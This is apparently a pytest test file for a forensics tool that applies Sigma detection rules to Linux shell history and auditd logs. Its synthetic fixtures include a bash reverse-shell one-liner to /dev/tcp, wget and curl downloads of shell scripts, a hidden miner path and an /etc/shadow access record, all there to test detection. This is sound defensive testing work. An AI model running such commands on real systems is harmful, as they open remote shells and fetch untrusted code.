"""Sigma over Linux logs: process fields, auditd fields, preflight and index mapping.

Rules and log lines are synthetic (documentation IP ranges, invented users) and written
for these tests; none is copied from a rule collection or a real system.
"""
from __future__ import annotations

from unittest.mock import MagicMock

import pytest
import yaml

from app.core import opensearch as os_module
from app.ingest.artifact_normalizers import normalize_linux_row
from app.ingest.linux.audit import parse_audit
from app.ingest.linux.process_context import split_command
from app.ingest.linux.shell_history import parse_shell_history
from app.ingest.normalizer import base_document
from app.rules_engine.sigma import (
    SIGMA_FIELD_MAP,
    basename_alternates,
    build_sigma_case_profile,
    build_sigma_query_from_compiled,
    compile_sigma_rule,
    evaluate_compiled_sigma_rule,
    preflight_sigma_rule,
)


def _doc(row: dict) -> dict:
    family = row["artifact_family"]
    base = base_document("case-1", "ev-1", "art-1", row, {"artifact_type": family})
    return normalize_linux_row(base, row, source_path=row["source_file"], artifact_type=family)


def _history_docs(*commands: str) -> list[dict]:
    rows = parse_shell_history("\n".join(commands) + "\n", source_path="home/alice/.bash_history")
    return [_doc(row) for row in rows]


def _audit_docs(log: str) -> list[dict]:
    return [_doc(row) for row in parse_audit(log, source_path="var/log/audit/audit.log")]


def _rule(text: str) -> dict:
    return yaml.safe_load(text)


def _fires(rule_text: str, doc: dict) -> bool:
    compiled = compile_sigma_rule(_rule(rule_text))
    assert compiled["compile_status"] == "compiled", compiled.get("compile_error")
    return bool(evaluate_compiled_sigma_rule(compiled, doc)["matched"])


DOWNLOAD_RULE = """
title: Download tool fetching over HTTP
logsource: {category: process_creation, product: linux}
detection:
  selection:
    Image|endswith: ['/wget', '/curl']
    CommandLine|contains: 'http'
  condition: selection
level: medium
"""

STRICT_PATH_RULE = """
title: wget from the standard path only
logsource: {category: process_creation, product: linux}
detection:
  selection:
    Image|endswith: '/usr/bin/wget'
  condition: selection
level: low
"""

AUDITD_ARGV_RULE = """
title: auditd execve of wget
logsource: {product: linux, service: auditd}
detection:
  selection:
    type: 'EXECVE'
    a0: 'wget'
  condition: selection
level: medium
"""

AUDITD_SYSCALL_RULE = """
title: auditd tagged curl execution
logsource: {product: linux, service: auditd}
detection:
  selection:
    exe|endswith: '/curl'
    key: 'susp_exec'
  condition: selection
level: medium
"""


# ------------------------------------------------------------ command splitting

@pytest.mark.parametrize(
    "command, expected",
    [
        ("wget http://203.0.113.9/x -O /tmp/x", ("wget", None)),
        ("/usr/bin/curl -s http://203.0.113.9", ("curl", "/usr/bin/curl")),
        ("sudo -u root wget http://203.0.113.9", ("wget", None)),
        ("FOO=1 BAR=2 python3 -c 'import os'", ("python3", None)),
        ("./payload --run", ("payload", "./payload")),
        ("nohup /tmp/.hidden/miner &", ("miner", "/tmp/.hidden/miner")),
        ("echo \"unterminated", ("echo", None)),
        ("sudo", (None, None)),
        ("", (None, None)),
    ],
)
def test_split_command_never_invents_a_path(command, expected):
    assert split_command(command) == expected


# ------------------------------------------------------------------ auditd parse

AUDIT_LOG = """\
type=SYSCALL msg=audit(1709288430.123:456): arch=c000003e syscall=59 success=yes exit=0 a0=55d0 a1=55d1 ppid=410 pid=411 auid=1000 uid=0 euid=0 comm="wget" exe="/usr/bin/wget" key="susp_exec"
type=EXECVE msg=audit(1709288430.123:456): argc=4 a0="wget" a1="-O" a2=2F746D702F612062 a3="http://203.0.113.9/x.sh"
type=USER_CMD msg=audit(1709288431.000:457): pid=500 uid=1000 auid=1000 msg='cwd="/home/alice" cmd=6C73202D6C61 exe="/usr/bin/sudo" res=success'
type=PROCTITLE msg=audit(1709288430.123:456): proctitle=7767657400687474703A2F2F78
type=PATH msg=audit(1709288432.000:458): item=0 name="/etc/shadow" nametype=NORMAL
"""


def test_execve_rebuilds_the_command_line_and_decodes_hex_arguments():
    rows = {r["audit_type"]: r for r in parse_audit(AUDIT_LOG)}
    execve = rows["EXECVE"]
    assert execve["command_line"] == "wget -O /tmp/a b http://203.0.113.9/x.sh"
    assert [execve[f"audit_a{i}"] for i in range(4)] == ["wget", "-O", "/tmp/a b", "http://203.0.113.9/x.sh"]


def test_syscall_fields_and_backward_compatible_command():
    syscall = {r["audit_type"]: r for r in parse_audit(AUDIT_LOG)}["SYSCALL"]
    assert syscall["exe"] == "/usr/bin/wget" and syscall["comm"] == "wget"
    assert syscall["audit_key"] == "susp_exec" and syscall["syscall"] == "59"
    assert syscall["ppid"] == 410 and syscall["euid"] == "0"
    # "command" keeps meaning comm= on records that carry no command line.
    assert syscall["command"] == "wget" and syscall["command_line"] is None
    # SYSCALL a0..a3 are raw register values, not strings: never decoded or exposed.
    assert "audit_a0" not in syscall


def test_fields_inside_a_quoted_msg_are_extracted():
    user_cmd = {r["audit_type"]: r for r in parse_audit(AUDIT_LOG)}["USER_CMD"]
    assert user_cmd["exe"] == "/usr/bin/sudo"
    assert user_cmd["cwd"] == "/home/alice"
    assert user_cmd["command_line"] == "ls -la"


def test_proctitle_and_path_records():
    rows = {r["audit_type"]: r for r in parse_audit(AUDIT_LOG)}
    assert rows["PROCTITLE"]["command_line"] == "wget http://x"
    assert rows["PATH"]["audit_name"] == "/etc/shadow"


def test_non_hex_unquoted_values_are_left_alone():
    row = parse_audit("type=SYSCALL msg=audit(1709288430.1:1): pid=12 comm=bash exe=(null)")[0]
    assert row["comm"] == "bash" and row["exe"] is None


# ------------------------------------------------------------------- normalizing

def test_shell_history_rows_get_process_fields():
    doc = _history_docs("wget http://203.0.113.9/x.sh -O /tmp/x")[0]
    assert doc["process"]["name"] == "wget"
    assert doc["process"]["command_line"] == "wget http://203.0.113.9/x.sh -O /tmp/x"
    assert not doc["process"].get("path"), "history never recorded a path: none may be invented"


def test_typed_path_is_kept_as_typed():
    doc = _history_docs("/usr/bin/curl -s http://203.0.113.9")[0]
    assert doc["process"]["path"] == "/usr/bin/curl" == doc["process"]["executable"]


def test_audit_rows_get_process_and_linux_fields():
    docs = {d["linux"]["audit_type"]: d for d in _audit_docs(AUDIT_LOG)}
    syscall = docs["SYSCALL"]
    assert syscall["process"]["executable"] == "/usr/bin/wget"
    assert syscall["process"]["name"] == "wget" and syscall["process"]["ppid"] == 410
    assert syscall["linux"]["audit_key"] == "susp_exec" and syscall["linux"]["exe"] == "/usr/bin/wget"
    execve = docs["EXECVE"]
    assert execve["process"]["command_line"].startswith("wget -O")
    assert execve["linux"]["audit_a0"] == "wget"


# ----------------------------------------------------------------- rule matching

def test_image_rule_fires_on_shell_history_by_process_name():
    hit, miss = _history_docs("wget http://203.0.113.9/x.sh", "ls -la /tmp")
    assert _fires(DOWNLOAD_RULE, hit) is True
    assert _fires(DOWNLOAD_RULE, miss) is False


def test_image_rule_requires_the_command_line_part_too():
    doc = _history_docs("wget --version")[0]
    assert _fires(DOWNLOAD_RULE, doc) is False


def test_image_rule_does_not_match_a_word_that_merely_mentions_the_tool():
    doc = _history_docs("echo wget http://203.0.113.9")[0]
    assert _fires(DOWNLOAD_RULE, doc) is False


def test_sudo_wrapped_command_is_attributed_to_the_real_program():
    doc = _history_docs("sudo -u root curl http://203.0.113.9")[0]
    assert _fires(DOWNLOAD_RULE, doc) is True


def test_a_rule_with_a_directory_component_stays_strict():
    typed_name_only, typed_path = _history_docs("wget http://203.0.113.9", "/usr/bin/wget http://203.0.113.9")
    assert _fires(STRICT_PATH_RULE, typed_name_only) is False
    assert _fires(STRICT_PATH_RULE, typed_path) is True


def test_auditd_argv_rule_fires_on_execve_only():
    docs = {d["linux"]["audit_type"]: d for d in _audit_docs(AUDIT_LOG)}
    assert _fires(AUDITD_ARGV_RULE, docs["EXECVE"]) is True
    assert _fires(AUDITD_ARGV_RULE, docs["SYSCALL"]) is False


def test_auditd_exe_and_key_rule():
    log = AUDIT_LOG.replace("/usr/bin/wget", "/usr/bin/curl").replace('comm="wget"', 'comm="curl"')
    syscall = {d["linux"]["audit_type"]: d for d in _audit_docs(log)}["SYSCALL"]
    assert _fires(AUDITD_SYSCALL_RULE, syscall) is True
    other = {d["linux"]["audit_type"]: d for d in _audit_docs(AUDIT_LOG)}["SYSCALL"]
    assert _fires(AUDITD_SYSCALL_RULE, other) is False


def test_process_creation_rule_fires_on_auditd_execve_but_not_on_the_syscall_record():
    docs = {d["linux"]["audit_type"]: d for d in _audit_docs(AUDIT_LOG)}
    assert _fires(DOWNLOAD_RULE, docs["EXECVE"]) is True
    # One execution is several audit records; only the EXECVE one is the process creation.
    assert _fires(DOWNLOAD_RULE, docs["SYSCALL"]) is False
    assert _fires(DOWNLOAD_RULE, docs["PATH"]) is False


def test_match_is_flagged_as_by_process_name():
    doc = _history_docs("wget http://203.0.113.9")[0]
    compiled = compile_sigma_rule(_rule(DOWNLOAD_RULE))
    result = evaluate_compiled_sigma_rule(compiled, doc)
    assert "sigma_image_matched_by_process_name" in result["data_quality"]


# --------------------------------------------------------------------- preflight

@pytest.mark.parametrize("rule_text", [DOWNLOAD_RULE, AUDITD_ARGV_RULE, AUDITD_SYSCALL_RULE])
def test_linux_case_is_runnable_for_linux_rules(rule_text):
    docs = _history_docs("wget http://203.0.113.9") + _audit_docs(AUDIT_LOG)
    profile = build_sigma_case_profile(docs)
    assert "linux" in profile["source_products"]
    status = preflight_sigma_rule(_rule(rule_text), profile)
    assert status["status"].startswith("runnable"), status


def test_command_line_only_rule_is_runnable_on_a_history_only_case():
    rule = _rule("""
title: Reverse shell one-liner
logsource: {category: process_creation, product: linux}
detection:
  selection:
    CommandLine|contains: '/dev/tcp/'
  condition: selection
""")
    profile = build_sigma_case_profile(_history_docs("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"))
    assert preflight_sigma_rule(rule, profile)["status"].startswith("runnable")


def test_a_case_without_the_needed_fields_is_still_skipped():
    docs = _history_docs("ls")
    profile = build_sigma_case_profile(docs)
    assert preflight_sigma_rule(_rule(AUDITD_ARGV_RULE), profile)["status"] == "skipped_missing_fields"


# ------------------------------------------------------------------- query / map

def test_basename_alternates_only_for_a_bare_slash_name():
    assert basename_alternates("Image", "endswith", ["/wget", "/usr/bin/curl", "\\cmd.exe"]) == ("process.name", ["wget"])
    assert basename_alternates("ParentImage", "endswith", "/bash") == ("process.parent_name", ["bash"])
    assert basename_alternates("Image", "contains", "/wget") == (None, [])
    assert basename_alternates("CommandLine", "endswith", "/wget") == (None, [])


def test_prefilter_query_keeps_the_process_name_candidates():
    compiled = compile_sigma_rule(_rule(DOWNLOAD_RULE))
    query = build_sigma_query_from_compiled(compiled)
    should = query["query"]["bool"]["should"]
    names = [c["term"]["process.name"]["value"] for c in should if "term" in c and "process.name" in c["term"]]
    assert set(names) >= {"wget", "curl"}


def test_auditd_field_names_are_mapped():
    for field in ("type", "exe", "key", "euid", "SYSCALL", "name", "cwd", "CurrentDirectory", *(f"a{i}" for i in range(8))):
        assert field in SIGMA_FIELD_MAP, field


# ---------------------------------------------------------------- index mapping

def _captured_linux_properties(monkeypatch, *, exists: bool) -> dict:
    client = MagicMock()
    monkeypatch.setattr(os_module, "get_opensearch_client", lambda **_: client)
    monkeypatch.setattr(os_module, "index_exists", lambda *_a, **_k: exists)
    monkeypatch.setattr(os_module, "_apply_safe_index_settings", lambda *_a, **_k: None, raising=False)
    os_module.ensure_case_index("11111111-1111-4111-8111-111111111111")
    call = client.indices.put_mapping if exists else client.indices.create
    body = call.call_args.kwargs["body"]
    mappings = body.get("mappings", body)
    return mappings["properties"]["linux"]["properties"]


@pytest.mark.parametrize("exists", [False, True], ids=["new-index", "existing-index-backfill"])
def test_every_linux_field_sigma_or_the_registry_relies_on_is_indexed(monkeypatch, exists):
    """Under ``dynamic: False`` an undeclared field is kept in _source but cannot be searched."""
    properties = _captured_linux_properties(monkeypatch, exists=exists)
    needed = {
        target.split(".", 1)[1]
        for targets in SIGMA_FIELD_MAP.values()
        for target in targets
        if target.startswith("linux.")
    }
    needed |= {"timestamp_status", "log_format"}
    missing = sorted(field for field in needed if field not in properties)
    assert missing == []
